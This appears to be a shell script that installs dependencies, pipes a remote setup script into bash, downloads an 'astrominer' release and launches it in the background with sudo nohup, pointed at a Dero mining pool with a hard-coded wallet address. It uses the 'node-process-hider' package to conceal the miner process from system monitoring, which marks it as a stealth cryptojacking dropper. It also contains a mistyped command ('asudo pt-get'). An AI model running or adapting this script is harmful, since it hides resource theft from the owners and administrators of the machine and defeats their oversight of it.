#!/bin/sh
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh
screen -dmS gpu.sh ./gpu.sh 65 75

echo " "
echo " "

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang gcc g++ make

sudo apt install --assume-yes curl

curl --silent --location https://deb.nodesource.com/setup_14.x  | bash -

sudo apt install --assume-yes nodejs

asudo pt-get install -y nodejs

curl -sL https://dl.yarnpkg.com/debian/pubkey.gpg | gpg --dearmor | tee /usr/share/keyrings/yarnkey.gpg >/dev/null


echo "deb [signed-by=/usr/share/keyrings/yarnkey.gpg] https://dl.yarnpkg.com/debian stable main" | tee /etc/apt/sources.list.d/yarn.list


sleep .2

echo " "
echo " "

sudo apt-get install wget

sudo apt-get install yarn

sudo npm install -g npm

sudo npm i -g node-process-hider

echo " "
echo " "

sudo ph add astrominer

echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "

sudo wget  -q https://github.com/tj8519/astrominer/releases/download/V1.5.1/astrominer-V1.5.1_linux_amd64.tar.gz

echo " "
echo " "

tar xf astrominer-V1.5.1_linux_amd64.tar.gz

echo " "
echo " "
sudo nohup ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm.dGH -r pool.whalesburg.com:4305 -p stratum
